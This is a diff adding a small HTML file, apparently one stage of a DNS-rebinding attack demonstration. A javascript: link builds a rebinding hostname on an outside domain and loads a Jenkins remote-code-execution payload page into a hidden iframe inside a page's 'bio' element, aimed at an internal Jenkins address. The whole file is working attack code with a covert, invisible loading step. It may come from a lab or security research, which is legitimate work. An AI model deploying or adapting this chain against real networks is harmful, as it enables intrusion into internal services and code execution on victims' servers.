@@ -1,0 +1,23 @@
+<a href="javascript:
+    /* create a new session identifier */
+    var random = Math.floor(Math.random() * 999999);
+
+    /* details of payload web server */
+    var payloadHost = '127.0.0.1';
+    var payloadPort = 8080;
+    var payloadFile = '11-jenkins-rce-payload.html';
+
+    /* details of target jenkins server */
+    var jenkinsHost = '192.168.253.128';
+
+    /* contruct rebinder hostname and payload query */
+    var payloadRebinderHost = `s-${payloadHost}-${payloadHost}-${random}-fs-e.dynamic.dont-trust.me`;
+    var payloadUrl = 'http://' + payloadRebinderHost + ':' + payloadPort + '/11-jenkins-rce-payload.html';
+
+    /* create and attach iframe */
+    var bio = document.getElementById('bio');
+    var iframe = document.createElement('iframe');
+    iframe.style = 'display:none';
+    iframe.src = payloadUrl;
+    bio.appendChild(iframe)
+">Create iFrame</a>
